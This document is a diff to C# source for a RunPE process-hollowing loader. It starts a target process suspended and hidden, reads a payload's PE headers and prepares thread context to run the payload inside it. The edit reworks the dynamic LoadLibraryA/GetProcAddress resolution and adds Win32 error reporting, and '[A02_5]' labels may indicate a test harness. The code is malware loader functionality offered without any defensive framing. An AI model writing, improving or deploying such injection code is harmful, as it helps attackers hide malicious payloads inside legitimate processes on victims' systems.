@@ -82,13 +82,27 @@ namespace RunPE
 
 
         #region CreateAPI
-        [DllImport("kernel32", SetLastError = true)]
-        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
-        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        private static CreateApi LoadApi<CreateApi>(string name, string method)
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        private static extern IntPtr LoadLibraryA(string lpLibFileName);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        private static T LoadApi<T>(string dllName, string functionName) where T : Delegate
         {
-            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+            IntPtr hModule = LoadLibraryA(dllName);
+            if (hModule == IntPtr.Zero)
+            {
+                throw new Exception($"LoadLibraryA failed for {dllName}. LastError={Marshal.GetLastWin32Error()}");
+            }
+
+            IntPtr procAddress = GetProcAddress(hModule, functionName);
+            if (procAddress == IntPtr.Zero)
+            {
+                throw new Exception($"GetProcAddress failed for {dllName}!{functionName}. LastError={Marshal.GetLastWin32Error()}");
+            }
+
+            return Marshal.GetDelegateForFunctionPointer<T>(procAddress);
         }
         #endregion
 
@@ -128,7 +142,7 @@ namespace RunPE
                 si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                 try
                 {
-                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
+                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception($"CreateProcessA failed. LastError={Marshal.GetLastWin32Error()}");
                     int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                     int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                     int[] context = new int[0xB3];
@@ -182,7 +196,7 @@ namespace RunPE
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"[A02_5] Failed: {ex.Message}");
+                    Console.WriteLine($"[A02_5] Failed: {ex}");
                     Console.WriteLine($"[A02_5] Last Win32 Error: {Marshal.GetLastWin32Error()}");
 
                     if (pi.ProcessId != 0)
